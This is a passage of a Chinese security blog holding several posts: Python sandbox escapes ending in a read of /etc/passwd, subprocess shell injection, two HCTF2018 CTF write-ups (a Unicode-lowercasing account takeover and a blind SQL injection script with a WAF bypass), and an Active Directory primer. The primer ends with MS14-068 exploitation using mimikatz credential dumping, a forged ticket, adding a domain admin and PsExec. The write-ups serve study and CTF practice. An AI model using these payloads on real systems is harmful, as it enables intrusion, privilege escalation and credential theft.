<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">$ python -m myapp</span><br><span class="line">   [&apos;&apos;,</span><br><span class="line">    &apos;/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg&apos;,</span><br><span class="line">    &apos;/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg&apos;,</span><br><span class="line">    ...]</span><br></pre></td></tr></table></figure>
<p>从上面程序执行结果可以看到，其当前工作目录被自动插入到sys.path中。<br>那么便可以在sys.path中出现的任意一个我们具有操作权限的目录写入我们要导入的模块，从而进行导入。<br>两外在沙箱环境中，很有可能会删除<br>然会我们继续查看，会发现sys下面又一个modules。我们对sys.moudles做一些改动，看看会发生什么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.modules[&apos;os&apos;]=None</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br></pre></td></tr></table></figure></p>
<p>果然如我们所料,将os从 sys.modules 中删掉之后,就不能再引入了。<br>那么当一个沙箱环境通过这种方式将可能带来危险的模块删除时，我们便可以重新导入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; sys.modules[&apos;os&apos;]=&apos;/usr/lib/python2.7/os.py&apos; </span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>另外如果sys也被禁止导入了呢？那么可以使用execfile()执行相应的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;)</span><br><span class="line">&gt;&gt;&gt; system(&apos;cat /etc/passwd&apos;)</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; getcwd()</span><br><span class="line">&apos;/usr/lib/python2.7&apos;</span><br></pre></td></tr></table></figure></p>
<h2 id="subprocess-shell注入"><a href="#subprocess-shell注入" class="headerlink" title="subprocess shell注入"></a>subprocess shell注入</h2><h3 id="shell-True时"><a href="#shell-True时" class="headerlink" title="shell = True时"></a>shell = True时</h3><p>此时如果命令参数可控，即可进行shell注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=subprocess.Popen(&apos;ls;id&apos;, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)</span><br></pre></td></tr></table></figure>
<h3 id="shell-False时"><a href="#shell-False时" class="headerlink" title="shell = False时"></a>shell = False时</h3><p>subprocess.call([]) 执行的是list拼接起来的命令，如果可控参数在拼接之后使得参数变成了参数选项，则存在命令注入风险<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from subprocess import call</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&gt;&gt;&gt; call([&apos;/bin/ls&apos;, &apos;/tmp&apos;])</span><br></pre></td></tr></table></figure></p>
<p>参考链接：<br><a href="https://access.redhat.com/blogs/766093/posts/2592591" target="_blank" rel="noopener">A bite of Python</a><br><a href="https://www.cnblogs.com/liuxiaowei/p/7414707.html" target="_blank" rel="noopener">Python 如何隐藏属性</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/12/Unicode安全/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="boogle">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Boogle's Blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/12/Unicode安全/" itemprop="url">Unicode安全</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-12T15:44:52+08:00">
                2018-11-12
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>结合HCTF2018的一道web题：admin</p>
<p><a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">题目源码</a></p>
<p>这道题比较有意思，思路偏门新奇。<br>题目的目标是以admin身份登陆，下载源码之后，是一个python基于flask框架写的一个web程序，审计代码之后发现，在注册、登陆、修改密码时都用到了strlower这个函数将username转化为小写。<br>而这里有一个偏门的小知识，那就是unicode安全，具体参考：<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">Unicode安全</a><br>我们这里可以利用的是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure></p>
<p>也就是我们注册一个 ᴬdmin的用户，注册时经过strlower转化会变为 Admin,而再修改密码时，又会转化为 admin。从而达到最终越权的目的。<br><img src="https://i.loli.net/2018/11/12/5be98862c3d79.png" alt></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/12/jsondecode解编码绕过sqlWAF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="boogle">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Boogle's Blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/12/jsondecode解编码绕过sqlWAF/" itemprop="url">jsondecode解编码绕过sqlWAF</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-12T15:43:04+08:00">
                2018-11-12
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>hctf2018的一道web题目：kzone。打开后是一个qq空间钓鱼网站，打开js跳转到qq zone官网。<br>禁用浏览器解析javascript：<br><img src="https://i.loli.net/2018/11/12/5be96883950fc.png" alt></p>
<p>搜一下目录之后发现<a href="http://www.zip,下载后得到源码。" target="_blank" rel="noopener">www.zip,下载后得到源码。</a><br>审计一波后台登陆<br>等均为发现可以利用的点。最后决定还是从2018.php入手。</p>
<p><img src="https://i.loli.net/2018/11/12/5be969410538d.png" alt><br>在第二行的位置引入了common.php，继续跟踪。<br><img src="https://i.loli.net/2018/11/12/5be9698a329c2.png" alt><br>在commen.php中又引入了其他的文件，最终定位在member.php。</p>
<p><img src="https://i.loli.net/2018/11/12/5be969fc416aa.png" alt><br>而且在member.php中并不是功能函数，那么也就是说在包含进该php文件后是会直接执行的，而且直接将传入的json数据直接带进了sql查询语句。本来到这剧情应该时一切顺利。直接开撸就可以了，但是在构造sleep盲注之后却发现没有任何反应。<br>无奈之下又去审计前面的代码。发现在safe.php中对传入的get,post,cookie进行了waf过滤。safe.php在member.php之前被加载，所以也被先执行。而且member.php第一行对IN_CRONLITE进行了判断，即不能直接访问member.php，只能从上层引入。<br><img src="https://i.loli.net/2018/11/12/5be96b119f521.png" alt><br>而且这个waf可以说拦截的非常严格了，盲注用到的sleep，benchmark均被过滤。然后到这就歇菜了。</p>
<p>最终还是看了大佬写的wiriteup：<a href="https://www.anquanke.com/post/id/163974" target="_blank" rel="noopener">HCTF2018-WEB-详细Write up</a></p>
<p>里面提到了jsondecode可以解编码，那么我们对关键字继续宁unicode编码之后传入，这样就直接绕过waf了。<br>具体jsondecode解编码见前辈的文章：<a href="http://blog.sina.com.cn/s/blog_1574497330102wruv.html" target="_blank" rel="noopener">浅谈json参数解析对waf绕过的影响</a></p>
<p>附文中脚本:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &apos;http://kzone.2018.hctf.io/include/common.php&apos;</span><br><span class="line">str1 = string.ascii_letters+string.digits+&apos;&#123;&#125;!@#$*&amp;_,&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(payload):</span><br><span class="line">    cookie=&#123;</span><br><span class="line">        &apos;PHPSESSID&apos;:&apos;8ehnp28ccr4ueh3gnfc3uqtau1&apos;,</span><br><span class="line">        &apos;islogin&apos;:&apos;1&apos;,</span><br><span class="line">        &apos;login_data&apos;:payload</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        requests.get(url,cookies=cookie,timeout=3)</span><br><span class="line">        return 0</span><br><span class="line">    except:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">result=&apos;&apos;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for j in str1:</span><br><span class="line">        #payload=&apos;&#123;&quot;admin_user&quot;:&quot;admin\&apos;and/**/\\u0069f(\\u0073ubstr((select/**/table_name/**/from/**/inf\\u006Frmation_schema.tables/**/where/**/table_schema\\u003Ddatabase()/**/limit/**/0,1),%d,1)\\u003D\&apos;%s\&apos;,\\u0073leep(3),0)/**/and/**/\&apos;1&quot;,&quot;admin_pass&quot;:65&#125;&apos;%(i,j)</span><br><span class="line">        payload = &apos;&#123;&quot;admin_user&quot;:&quot;admin\&apos;/**/and/**/\\u0069f(\\u0061scii(\\u0073ubstr((select/**/F1a9/**/from/**/F1444g),%s,1))\\u003d%s,\\u0073leep(4),1)/**/and/**/\&apos;1&quot;,&quot;admin_pass&quot;:&quot;123&quot;&#125;&apos;% (str(i),ord(j))      </span><br><span class="line">        #print(&apos;[+]&apos;+payload)</span><br><span class="line">        if check(payload):     </span><br><span class="line">            result += j</span><br><span class="line">            break</span><br><span class="line">    print result</span><br></pre></td></tr></table></figure>
<p>两外也有大佬编写了tamper，直接掏出了sqlmap也是非常的方便:<a href="https://www.anquanke.com/post/id/163958" target="_blank" rel="noopener">用sqlmap解题2018HCTF-Kzone</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/01/域渗透基础/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="boogle">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Boogle's Blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/01/域渗透基础/" itemprop="url">域渗透基础</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-01T15:17:31+08:00">
                2018-09-01
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/windows安全/" itemprop="url" rel="index">
                    <span itemprop="name">windows安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h2><h3 id="1-域和工作组的区别"><a href="#1-域和工作组的区别" class="headerlink" title="1.域和工作组的区别"></a>1.域和工作组的区别</h3><p>域和工作组是局域网上两种不同的网络资源管理模式，它们之间的主要区别是对网络中的计算机和其他资源的管理方式不同。</p>
<ul>
<li><p>工作组</p>
<ul>
<li><p>概述：工作组是最常用最简单最普遍的资源管理模式。为什么说他简单是因为默认情况下windows计算机都是采用工作组方式进行资源管理的。默认情况下所有计算机都处在名为workgroup的工作组中。</p>
</li>
<li><p>优点：将不同的电脑一般按功能分别列入不同的组中，如软件部的电脑都列入“软件部”工作组中，网络部的电脑都列入“网络部”工作组中。你要访问某个部门的资源，就在“网上邻居”里找到那个部门的工作组名，双击就可以看到那个部门的电脑了。计算机通过工作组进行分类，使得我们访问资源更加具有层次化。</p>
</li>
<li><p>问题：没有办法统一管理（比如统一安装软件）；没办法集中身份验证（工作组中的计算机相互独立，相互访问时需要输入密码的）</p>
</li>
<li><p>特点：工作组资源管理模式适合于网络中计算机不多，对管理要求不严格的情况。他的建立步骤简单，使用起来也很好上手。大部分中小公司都采取工作组的方式对资源进行权限分配和目录共享。</p>
</li>
</ul>
</li>
<li><p>域</p>
<ul>
<li>概述：与工作组的平等性有所不同，“域”是一个相对严格的管理模式，解决了工作组无法统一管理、没办法集中身份验证的问题。“域”指的是服务器控制网络上的计算机能否加入。实行严格的管理对网络安全是非常必要的。</li>
<li>概念解释：<br>活动目录（Active Directory），AD：活动目录是WindowsServer在网络环境中提供的“资源目录”。活动目录是储存着域中相关资源信息的目录，例如计算机，用户组，数据库，服务器，打印机，用户属性（权限等），就像一个数据库。<br>域控（Domain Controller），DC：安装了AD的服务器就是域控制器，即有AD的计算机就是DC。</li>
</ul>
</li>
</ul>
<h3 id="2-DNS定位域控制器"><a href="#2-DNS定位域控制器" class="headerlink" title="2.DNS定位域控制器"></a>2.DNS定位域控制器</h3><p>DNS负责将域名解析成IP地址</p>
<p>内网的DNS则可以定位DC，域会有名称，比如domaintest。域会向DNS注册这个名称，即SRV记录。域中的计算机访问SRV来进而访问DC。</p>
<p>通常DNS和DC会安装在同一计算机上，因而此计算的本地连接DNS要指向自身。</p>
<h3 id="3-AD-活动目录）的安装"><a href="#3-AD-活动目录）的安装" class="headerlink" title="3.AD(活动目录）的安装"></a>3.AD(活动目录）的安装</h3><p>Windows2008R2中创建域控制器参考文章<a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">Windows2008如何配置域控制器(活动目录)</a><br>主要命令dcpromo然后根据需要下一步即可。</p>
<p>搭建完AD之后，主域控会生成一个krbtgt账号，他是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份认证</p>
<h3 id="4-域成员主机加入"><a href="#4-域成员主机加入" class="headerlink" title="4.域成员主机加入"></a>4.域成员主机加入</h3><p>域成员的加入，需要注意的是：</p>
<ul>
<li>配置成员主机与控制在同一ip段</li>
<li>配置成员主机dns为域控ip（域控主机被设置为DNS服务器）</li>
<li>在我的电脑-属性-电脑名称中修改domain即可，输入域控主机名字然后弹出窗口输入账号密码即可。<br><a href="https://imgchr.com/i/PT3Alq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/22/PT3Alq.md.png" alt="PT3Alq.md.png"></a></li>
</ul>
<p>那么在加入域之后有什么变化呢？</p>
<p>其中比较明显的就是在登陆的时候，可以发现xp传统的登陆界面没有了。而出现了一个登陆界面，在这个界面中可可以选择以域内其他用户的身份登陆主机。</p>
<p><img src="https://s1.ax1x.com/2018/08/22/PT3B9A.png" alt="PT3B9A.png"></p>
<h3 id="添加域用户"><a href="#添加域用户" class="headerlink" title="添加域用户"></a>添加域用户</h3><p><img src="https://s1.ax1x.com/2018/09/07/iCXIR1.png" alt="此处输入图片的描述"></p>
<hr>
<p>思考?</p>
<p>域管理员、域用户、域成员主机？区别</p>
<hr>
<h2 id="0x02-kerberos"><a href="#0x02-kerberos" class="headerlink" title="0x02 kerberos"></a>0x02 kerberos</h2><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p>kerberos一词原意为希腊神话中守护地狱之门的一条三头神犬。麻省理工学院在雅典娜计划中以此为名，提出了并实现了用于计算机网络的身份认证协议。以kerberos为名，显示了该协议具有相当的安全性。</p>
<h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ul>
<li>一个安全认证协议</li>
<li>用tickets验证</li>
<li>避免本地保存密码和在互联网上传输密码</li>
<li>包含一个可信任的第三方</li>
<li>使用对称加密</li>
<li>客户端与服务器之间能够相互验证</li>
</ul>
<p>以上的特点表明，Kerberos只提供一种功能——在网络上安全的完成用户的身份验证</p>
<h3 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h3><p>kerberos协议的认证过程可以两个部分：</p>
<ul>
<li>证明自己</li>
<li>请求他人</li>
</ul>
<p>在说明kerberos的认证过程之前，先简单介绍几个基本的名词。</p>
<ul>
<li>KDC (key distribution center)     key分配中心，受信任的第三方<ul>
<li>AS  (the Authentication Server)       认证服务</li>
<li>TGS (Ticket Granting Service)         票据授予服务<ul>
<li>TGT (ticket-granting ticket)      票据<br><a href="https://imgchr.com/i/iCjGFJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/07/iCjGFJ.md.jpg" alt="iCjGFJ.md.jpg"></a><br>那么从上面的层次可以大概了解到，KDC作为kerberos协议信任的第三方，包括AS和TGS,而TGT票据是由TGS授予的。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="证明自己的过程"><a href="#证明自己的过程" class="headerlink" title="证明自己的过程"></a>证明自己的过程</h4><p>Client向KDC发送自己的身份信息，KDC从Ticket Granting Service得到TGT(ticket-granting ticket)， 并用协议开始前Client与KDC之间的密钥将TGT加密回复给Client。<br>此时只有真正的Client才能利用它与KDC之间的密钥将加密后的TGT解密，从而获得TGT。（此过程避免了Client直接向KDC发送密码，以求通过验证的不安全方式）</p>
<h4 id="请求他人的过程"><a href="#请求他人的过程" class="headerlink" title="请求他人的过程"></a>请求他人的过程</h4><p>Client利用之前获得的TGT向KDC请求其他Service的Ticket，从而通过其他Service的身份鉴别。</p>
<p>1． Client将之前获得TGT和要请求的服务信息(服务名等)发送给KDC，KDC中的Ticket Granting Service将为Client和Service之间生成一个Session Key用于Service对Client的身份鉴别。然后KDC将这个Session Key和用户名，用户地址（IP），服务名，有效期, 时间戳一起包装成一个Ticket(这些信息最终用于Service对Client的身份鉴别)发送给Service， 不过Kerberos协议并没有直接将Ticket发送给Service，而是通过Client转发给Service.所以有了第二步。<br>2． 此时KDC将刚才的Ticket转发给Client。由于这个Ticket是要给Service的，不能让Client看到，所以KDC用协议开始前KDC与Service之间的密钥将Ticket加密后再发送给Client。同时为了让Client和Service之间共享那个秘密(KDC在第一步为它们创建的Session Key)， KDC用Client与它之间的密钥将Session Key加密随加密的Ticket一起返回给Client。<br>3． 为了完成Ticket的传递，Client将刚才收到的Ticket转发到Service. 由于Client不知道KDC与Service之间的密钥，所以它无法算改Ticket中的信息。同时Client将收到的Session Key解密出来，然后将自己的用户名，用户地址（IP）打包成Authenticator用Session Key加密也发送给Service。<br>4． Service 收到Ticket后利用它与KDC之间的密钥将Ticket中的信息解密出来，从而获得Session Key和用户名，用户地址（IP），服务名，有效期。然后再用Session Key将Authenticator解密从而获得用户名，用户地址（IP）将其与之前Ticket中解密出来的用户名，用户地址（IP）做比较从而验证Client的身份。<br>5． 如果Service有返回结果，将其返回给Client。</p>
<p><a href="https://imgchr.com/i/PjvNKH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/31/PjvNKH.md.png" alt="PjvNKH.md.png"></a></p>
<p>上面是标准Kerberos协议的基本流程，MIT也实现了一套标准的Kerberos协议，而微软在Windows平台上的Kerberos并没有采用MIT的实现，而是对Kerberos协议进行了一些扩充，其中最重要的扩充就是增加了认证过程中的权限认证，也就是在协议中增加了PAC（PrivilegeAttribute Certificate），特权属性证书。</p>
<h2 id="0X03-信息收集"><a href="#0X03-信息收集" class="headerlink" title="0X03 信息收集"></a>0X03 信息收集</h2><ul>
<li>常用命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ipconfig /all                            ------ 查询本机IP段，所在域等</span><br><span class="line">net user                                 ------ 本机用户列表</span><br><span class="line">net localgroup administrators            ------ 本机管理员[通常含有域用户]</span><br><span class="line">net user /domain                         ------ 查询域用户</span><br><span class="line">net group /domain                        ------ 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain        ------ 查询域管理员用户组</span><br><span class="line">net localgroup administrators /domain    ------ 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 /add   ------域用户添加到本机</span><br><span class="line">net group &quot;domain controllers&quot; /domain                 ------ 查看域控制器(如果有多台)</span><br><span class="line">net time /domain                  ------ 判断主域，主域服务器都做时间服务器</span><br><span class="line">net config workstation            ------ 当前登录域</span><br><span class="line">net session                       ------ 查看当前会话</span><br><span class="line">net use \\ip\ipc$ pawword /user:username      ------ 建立IPC会话</span><br><span class="line">net share                          ------  查看SMB指向的路径[即共享]</span><br><span class="line">net view                           ------ 查询同一域内机器列表</span><br><span class="line">net view \\ip                      ------ 查询某IP共享</span><br><span class="line">net view /domain                   ------ 查询域列表</span><br><span class="line">net view /domain:domainname        ------ 查看workgroup域中计算机列表</span><br><span class="line">net start                          ------ 查看当前运行的服务</span><br><span class="line">net accounts                       ------  查看本地密码策略</span><br><span class="line">net accounts /domain               ------  查看域密码策略</span><br><span class="line">nbtstat –A ip                     ------netbios 查询</span><br><span class="line">netstat –an/ano/anb               ------ 网络连接查询</span><br><span class="line">route print                        ------ 路由表</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasklist /V                                         ----- 查看进程[显示对应用户]</span><br><span class="line">tasklist /S ip /U domain\username /P /V             ----- 查看远程计算机进程列表</span><br><span class="line">qprocess *                                          ----- 类似tasklist</span><br><span class="line">qprocess /SERVER:IP                                 ----- 远程查看计算机进程列表</span><br><span class="line">nslookup –qt-MX Yahoo.com                          ----- 查看邮件服务器</span><br><span class="line">whoami /all                                         ----- 查询当前用户权限等</span><br><span class="line">set                                                 ----- 查看系统环境变量</span><br><span class="line">systeminfo                                          ----- 查看系统信息</span><br><span class="line">qwinsta                                             ----- 查看登录情况</span><br><span class="line">qwinsta /SERVER:IP                                  ----- 查看远程登录情况</span><br><span class="line">fsutil fsinfo drives                                ----- 查看所有盘符</span><br><span class="line">gpupdate /force                                     ----- 更新域策略</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="0x04-获取域管理员权限：MS14-068"><a href="#0x04-获取域管理员权限：MS14-068" class="headerlink" title="0x04 获取域管理员权限：MS14-068"></a>0x04 获取域管理员权限：MS14-068</h2><p>ms14-068漏洞在域控没有打补丁（kb3011780）时，能将任意域用户，提升为域管理员权限。</p>
<p>该漏洞利用是通过客户端来伪造高权限的PAC产生的。<br>详细介绍：<a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">深入解读MS14-068漏洞</a><br>补充：添加域用户<a href="https://www.knowsec.net/archives/258/" target="_blank" rel="noopener">MS14-068 域用户权限提升漏洞复现</a></p>
<ul>
<li>神器mimikatz </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
<ul>
<li>ms14068.exe  伪造kerberos票据<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot;  /domain   获取计算机名称</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u test@domaintest.com -p 123456 -s S-1-5-21-1607545464-3564583392-2085136103-1114</span><br><span class="line">-d WIN-0IQJV7P073G.domaintest.com</span><br></pre></td></tr></table></figure>
<ul>
<li>mimikatz 导入票据</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc TGT_test@domaintest.com.ccache&quot; exit</span><br></pre></td></tr></table></figure>
<p>拿到域管理权限便可进行其他一系列操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-0IQJV7P073G.domaintest.com\c$    注意这里应为域控主机名称，不能为ip</span><br><span class="line"></span><br><span class="line">net user admin xxxxx@password /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; admin /add /domain</span><br><span class="line"></span><br><span class="line">PsExec.exe \\192.168.111.129 cmd.exe</span><br></pre></td></tr></table></figure></p>
